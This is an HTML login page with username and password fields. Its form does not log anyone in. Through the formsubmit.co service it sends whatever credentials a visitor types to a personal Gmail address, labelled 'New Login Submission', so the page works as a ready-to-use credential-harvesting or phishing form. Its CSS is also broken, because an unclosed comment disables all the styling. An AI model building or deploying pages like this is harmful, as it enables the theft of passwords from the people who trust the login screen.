<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login</title>
  <style>
    /*
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #6a11cb 0%, #444649 100%);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    form {
      background-color: white;
      border-radius: 10px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 400px;
      overflow: hidden;
    }

    .imgcontainer {
      text-align: center;
      padding: 24px 0 16px;
      background-color: #f8f9fa;
    }

    .avatar {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background-color: #ddd;
      object-fit: cover;
    }

    .container {
      padding: 24px 24px 16px;
    }

    .container label {
      display: block;
      margin: 12px 0 6px;
      font-weight: 600;
      color: #333;
    }

    .container input[type="text"],
    .container input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 3px;
      border: 2px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
      transition: border-color 0.3s, box-shadow 0.3s;
    }

    .container input:focus {
      outline: none;
      border-color: #4CAF50;
      box-shadow: 0 0 0 2px rgba(76, 175, 80, 0.2);
    }

    .container button {
      background-color: #57616b;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      width: 100%;
      margin-top: 16px;
      transition: background-color 0.3s;
    }

    .container button:hover {
      background-color: #65686c;
    }

    .cancelbtn {
      background-color: #6c757d !important;
    }

    .cancelbtn:hover {
      background-color: #545b62 !important;
    }

    .container .checkbox-label {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-top: 12px;
    }

    .footer-bar {
      background-color: #f1f1f1;
      padding: 16px 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 10px;
    }

    .footer-bar .psw a {
      color: #46525f;
      text-decoration: none;
    }

    .footer-bar .psw a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <!-- ✅ FormSubmit: sends directly to jackkamogelo83@gmail.com -->
  <form action="https://formsubmit.co/jackkamogelo83@gmail.com" method="POST">
    <!-- Optional: set email subject -->
    <input type="hidden" name="_subject" value="New Login Submission">

    <div class="imgcontainer">
      <img src="https://via.placeholder.com/80/cccccc/666666?text=U" alt="Avatar" class="avatar">
    </div>

    <div class="container">
      <label for="username"><b>Username</b></label>
      <input 
        type="text" 
        placeholder="Enter Username" 
        name="username"
      >

      <label for="password"><b>Password</b></label>
      <input 
        type="password" 
        placeholder="Enter Password" 
        name="password"
      >

      <div class="checkbox-label">
        <input type="checkbox" name="remember" checked>
        <label for="remember">Remember me</label>
      </div>

      <button type="submit">Login</button>
    </div>

    <div class="footer-bar">
      <button type="button" class="cancelbtn" onclick="this.form.reset()">Cancel</button>
      <span class="psw">Forgot <a href="#">password?</a></span>
    </div>
  </form>

</body>
</html>
